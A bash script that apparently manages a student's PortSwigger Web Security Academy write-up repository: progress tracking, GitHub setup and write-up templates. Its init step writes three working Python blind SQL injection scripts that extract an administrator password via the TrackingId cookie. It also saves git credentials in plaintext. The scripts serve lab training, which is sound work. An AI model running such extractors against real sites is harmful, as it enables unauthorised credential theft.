#!/bin/bash

# ============================================
# PortSwigger Lab Manager - All in One
# Usage:
#   ./manage.sh setup          → first time setup
#   ./manage.sh push "message" → commit and push
#   ./manage.sh new "lab name" "topic" → create writeup
#   ./manage.sh progress       → show stats
#   ./manage.sh init           → setup everything from scratch
# ============================================

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'
BOLD='\033[1m'

REPO_DIR="$(cd "$(dirname "$0")" && pwd)"

# ============================================
# PROGRESS DATA - Update manually after solving
# ============================================
declare -A LABS=(
  # SQL Injection
  ["sql-injection/01-where-clause-hidden-data"]="APPRENTICE|Solved"
  ["sql-injection/02-login-bypass"]="APPRENTICE|Solved"
  ["sql-injection/03-oracle-version"]="PRACTITIONER|Solved"
  ["sql-injection/04-mysql-microsoft-version"]="PRACTITIONER|Solved"
  ["sql-injection/05-list-contents-non-oracle"]="PRACTITIONER|Solved"
  ["sql-injection/06-list-contents-oracle"]="PRACTITIONER|Solved"
  ["sql-injection/07-union-column-count"]="PRACTITIONER|Solved"
  ["sql-injection/08-union-find-text-column"]="PRACTITIONER|Solved"
  ["sql-injection/09-union-retrieve-data"]="PRACTITIONER|Solved"
  ["sql-injection/10-union-multiple-values"]="PRACTITIONER|Solved"
  ["sql-injection/11-blind-conditional-responses"]="PRACTITIONER|Solved"
  ["sql-injection/12-blind-conditional-errors"]="PRACTITIONER|Solved"
  ["sql-injection/13-visible-error-based"]="PRACTITIONER|Solved"
  ["sql-injection/14-blind-time-delays"]="PRACTITIONER|Solved"
  ["sql-injection/15-blind-time-delays-retrieval"]="PRACTITIONER|Solved"
  ["sql-injection/16-blind-oob-interaction"]="PRACTITIONER|Not solved"
  ["sql-injection/17-blind-oob-exfiltration"]="PRACTITIONER|Not solved"
  ["sql-injection/18-xml-filter-bypass"]="PRACTITIONER|Solved"
  # Access Control
  ["access-control/09-insecure-direct-object-references"]="APPRENTICE|Solved"
)

show_progress() {
    echo -e "\n${BOLD}${CYAN}╔════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${CYAN}║     PortSwigger Progress Dashboard     ║${NC}"
    echo -e "${BOLD}${CYAN}╚════════════════════════════════════════╝${NC}\n"

    total=0
    solved=0
    apprentice_solved=0
    practitioner_solved=0
    expert_solved=0

    declare -A topic_total
    declare -A topic_solved

    for lab in "${!LABS[@]}"; do
        IFS='|' read -r level status <<< "${LABS[$lab]}"
        topic=$(echo "$lab" | cut -d'/' -f1)
        total=$((total + 1))
        topic_total[$topic]=$((${topic_total[$topic]:-0} + 1))

        if [ "$status" == "Solved" ]; then
            solved=$((solved + 1))
            topic_solved[$topic]=$((${topic_solved[$topic]:-0} + 1))
            case $level in
                APPRENTICE) apprentice_solved=$((apprentice_solved + 1)) ;;
                PRACTITIONER) practitioner_solved=$((practitioner_solved + 1)) ;;
                EXPERT) expert_solved=$((expert_solved + 1)) ;;
            esac
        fi
    done

    echo -e "${BOLD}Overall Progress:${NC}"
    echo -e "  Total Solved:      ${GREEN}$solved${NC} / $total"
    echo -e "  Apprentice:        ${GREEN}$apprentice_solved${NC} solved"
    echo -e "  Practitioner:      ${GREEN}$practitioner_solved${NC} solved"
    echo -e "  Expert:            ${GREEN}$expert_solved${NC} solved"

    echo -e "\n${BOLD}By Topic:${NC}"
    for topic in $(echo "${!topic_total[@]}" | tr ' ' '\n' | sort); do
        s=${topic_solved[$topic]:-0}
        t=${topic_total[$topic]}
        if [ "$s" == "$t" ]; then
            echo -e "  ${GREEN}✅ $topic: $s/$t${NC}"
        else
            echo -e "  ${YELLOW}🔄 $topic: $s/$t${NC}"
        fi
    done

    echo -e "\n${BOLD}Hall of Fame Progress:${NC}"
    echo -e "  Need 58 more Apprentice labs to reach Apprentice level"
    echo -e "  Current: ${GREEN}3/61${NC} Apprentice | ${GREEN}14/174${NC} Practitioner\n"
}

setup_github() {
    echo -e "${YELLOW}GitHub Setup${NC}"
    echo "========================="

    echo -e "${YELLOW}Enter GitHub username:${NC}"
    read -r GH_USERNAME
    git config --global user.name "$GH_USERNAME"

    echo -e "${YELLOW}Enter GitHub email:${NC}"
    read -r GH_EMAIL
    git config --global user.email "$GH_EMAIL"

    cd "$REPO_DIR" || exit 1

    if [ ! -d ".git" ]; then
        git init
        git branch -M main
        echo -e "${GREEN}Git initialized${NC}"
    fi

    echo -e "${YELLOW}Paste your GitHub repo URL:${NC}"
    echo "Example: https://github.com/username/portswigger-writeups.git"
    read -r REPO_URL

    if git remote | grep -q origin; then
        git remote set-url origin "$REPO_URL"
    else
        git remote add origin "$REPO_URL"
    fi

    echo -e "${GREEN}Remote set!${NC}"
    echo ""
    echo -e "${YELLOW}GitHub Token Instructions:${NC}"
    echo "1. Go to github.com → Settings → Developer Settings"
    echo "2. Personal Access Tokens → Tokens (classic)"
    echo "3. Generate new token with 'repo' permissions"
    echo "4. Use token as password when pushing"
    echo ""

    git add .
    git commit -m "initial commit - portswigger writeups setup $(date '+%d %b %Y')"
    git push -u origin main

    if [ $? -eq 0 ]; then
        echo -e "\n${GREEN}Setup complete! Repo is live.${NC}"
        git config --global credential.helper store
        echo -e "${GREEN}Credentials saved - no more password prompts!${NC}"
    else
        echo -e "\n${RED}Push failed. Check your token and repo URL.${NC}"
    fi
}

push_changes() {
    cd "$REPO_DIR" || exit 1

    if [ ! -d ".git" ]; then
        echo -e "${RED}Not a git repo. Run: ./manage.sh setup first${NC}"
        exit 1
    fi

    MSG="${1:-writeup update $(date '+%d %b %Y %H:%M')}"

    git add .

    if git diff --cached --quiet; then
        echo -e "${YELLOW}Nothing to push. Write a writeup first!${NC}"
        exit 0
    fi

    echo -e "${YELLOW}Files being pushed:${NC}"
    git diff --cached --name-only

    git commit -m "$MSG"
    git push origin main

    if [ $? -eq 0 ]; then
        echo -e "\n${GREEN}Pushed successfully!${NC}"
    else
        echo -e "\n${RED}Push failed. Check connection or token.${NC}"
    fi
}

new_writeup() {
    LAB_NAME="${1:-untitled-lab}"
    TOPIC="${2:-misc}"
    DATE=$(date '+%d-%m-%Y')
    SLUG=$(echo "$LAB_NAME" | tr '[:upper:]' '[:lower:]' | tr ' ' '-')
    DIR="$REPO_DIR/writeups/$TOPIC"
    FILE="$DIR/$DATE-$SLUG.md"

    mkdir -p "$DIR"

    cat > "$FILE" << EOF
# Lab: $LAB_NAME

- **Topic:** $TOPIC
- **Difficulty:** [Apprentice / Practitioner / Expert]
- **Date:** $DATE
- **Status:** ❌ Unsolved

---

## What was the vulnerability?

[Explain what the bug was in simple terms]

---

## How did I find it?

[What did you test? What gave it away?]

---

## Payload used

\`\`\`
[paste your payload here]
\`\`\`

---

## Why did it work?

[Explain the underlying reason]

---

## What would fix it?

[How would a developer patch this?]

---

## Key takeaway

[One sentence - what's the most important thing you learned?]
EOF

    echo -e "${GREEN}Created: $FILE${NC}"
    echo -e "${YELLOW}Fill it in then run: ./manage.sh push \"$LAB_NAME solved\"${NC}"
}

init_all() {
    echo -e "${BOLD}${CYAN}Setting up everything from scratch...${NC}\n"

    cd "$REPO_DIR" || exit 1

    # Create folder structure
    echo -e "${YELLOW}Creating folder structure...${NC}"
    mkdir -p writeups/{sql-injection,xss,csrf,access-control,authentication,ssrf,api-testing,xxe,jwt,path-traversal,file-upload,business-logic,information-disclosure}
    mkdir -p tools

    # Copy Python tools
    echo -e "${YELLOW}Setting up tools...${NC}"
    
    cat > tools/blind_sqli_responses.py << 'EOF'
import requests
import string

URL = "CHANGE_ME"
SESSION_COOKIE = "CHANGE_ME"
TRACKING_ID = "CHANGE_ME"
PASSWORD_LENGTH = 20
CHARS = string.ascii_lowercase + string.digits
SUCCESS_TEXT = "Welcome back"

def check_char(position, char):
    payload = f"{TRACKING_ID}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1)='{char}"
    cookies = {"TrackingId": payload, "session": SESSION_COOKIE}
    response = requests.get(URL, cookies=cookies)
    return SUCCESS_TEXT in response.text

def extract_password():
    password = ""
    for position in range(1, PASSWORD_LENGTH + 1):
        for char in CHARS:
            print(f"[*] Position {position}: trying '{char}'", end="\r")
            if check_char(position, char):
                password += char
                print(f"[+] Position {position}: '{char}' ✓")
                break
    return password

if __name__ == "__main__":
    password = extract_password()
    print(f"\n[+] Password: {password}")
EOF

    cat > tools/blind_sqli_errors.py << 'EOF'
import requests

URL = "CHANGE_ME"
SESSION_COOKIE = "CHANGE_ME"
TRACKING_ID = "CHANGE_ME"
PASSWORD_LENGTH = 20
CHARS = "abcdefghijklmnopqrstuvwxyz0123456789"

def check_char(position, char):
    payload = (f"{TRACKING_ID}' AND (SELECT CASE WHEN (SUBSTR(password,{position},1)='{char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a")
    cookies = {"TrackingId": payload, "session": SESSION_COOKIE}
    response = requests.get(URL, cookies=cookies)
    return response.status_code == 500

def extract_password():
    password = ""
    for position in range(1, PASSWORD_LENGTH + 1):
        for char in CHARS:
            print(f"[*] Position {position}: trying '{char}'", end="\r")
            if check_char(position, char):
                password += char
                print(f"[+] Position {position}: '{char}' ✓")
                break
    return password

if __name__ == "__main__":
    password = extract_password()
    print(f"\n[+] Password: {password}")
EOF

    cat > tools/blind_sqli_time.py << 'EOF'
import requests
import time

URL = "CHANGE_ME"
SESSION_COOKIE = "CHANGE_ME"
TRACKING_ID = "CHANGE_ME"
PASSWORD_LENGTH = 20
CHARS = "abcdefghijklmnopqrstuvwxyz0123456789"

def check_char(position, char):
    payload = (f"{TRACKING_ID}'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{position},1)='{char}') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--")
    cookies = {"TrackingId": payload, "session": SESSION_COOKIE}
    start = time.time()
    requests.get(URL, cookies=cookies)
    return time.time() - start > 2.5

def extract_password():
    password = ""
    for position in range(1, PASSWORD_LENGTH + 1):
        for char in CHARS:
            print(f"[*] Position {position}: trying '{char}'", end="\r")
            if check_char(position, char):
                password += char
                print(f"[+] Position {position}: '{char}' ✓")
                break
    return password

if __name__ == "__main__":
    password = extract_password()
    print(f"\n[+] Password: {password}")
EOF

    # Create README
    cat > README.md << 'EOF'
# PortSwigger Web Security Academy — Writeups

Security portfolio for EPFL/ETH Masters application.
Focusing on Cloud AppSec — web vulnerabilities + cloud infrastructure attacks.

## Progress

| Topic | Solved | Total |
|---|---|---|
| SQL Injection | 16 | 18 |
| XSS | 0 | 30 |
| CSRF | 0 | 12 |
| Access Control | 1 | 13 |
| Authentication | 0 | 14 |
| SSRF | 0 | 7 |
| API Testing | 0 | 5 |
| JWT | 0 | 8 |
| Path Traversal | 0 | 6 |
| File Upload | 0 | 7 |
| XXE | 0 | 9 |

## Tools

- `tools/blind_sqli_responses.py` — Blind SQLi conditional responses extractor
- `tools/blind_sqli_errors.py` — Blind SQLi conditional errors extractor (Oracle)
- `tools/blind_sqli_time.py` — Blind SQLi time delay extractor

## Structure

```
writeups/
├── sql-injection/
├── xss/
├── csrf/
├── authentication/
├── access-control/
├── ssrf/
├── api-testing/
├── jwt/
└── ...
tools/
├── blind_sqli_responses.py
├── blind_sqli_errors.py
└── blind_sqli_time.py
```

*Started: May 2026*
EOF

    chmod +x manage.sh
    echo -e "${GREEN}All folders and tools created!${NC}"
    echo ""

    # Ask if they want to setup GitHub now
    echo -e "${YELLOW}Setup GitHub now? (y/n):${NC}"
    read -r SETUP_GH
    if [ "$SETUP_GH" == "y" ]; then
        setup_github
    else
        echo -e "${YELLOW}Run './manage.sh setup' when ready for GitHub${NC}"
    fi

    echo -e "\n${GREEN}${BOLD}All done! Your commands:${NC}"
    echo -e "  ${CYAN}./manage.sh progress${NC}  → see your stats"
    echo -e "  ${CYAN}./manage.sh push \"msg\"${NC} → push to GitHub"
    echo -e "  ${CYAN}./manage.sh new \"lab name\" \"topic\"${NC} → new writeup"
}

# ============================================
# MAIN
# ============================================
case "$1" in
    setup)    setup_github ;;
    push)     push_changes "$2" ;;
    new)      new_writeup "$2" "$3" ;;
    progress) show_progress ;;
    init)     init_all ;;
    *)
        echo -e "${BOLD}PortSwigger Lab Manager${NC}"
        echo ""
        echo "Commands:"
        echo -e "  ${CYAN}./manage.sh init${NC}              → setup everything from scratch"
        echo -e "  ${CYAN}./manage.sh setup${NC}             → connect to GitHub"
        echo -e "  ${CYAN}./manage.sh push \"message\"${NC}    → commit and push"
        echo -e "  ${CYAN}./manage.sh new \"name\" \"topic\"${NC} → create writeup"
        echo -e "  ${CYAN}./manage.sh progress${NC}          → show stats"
        ;;
esac
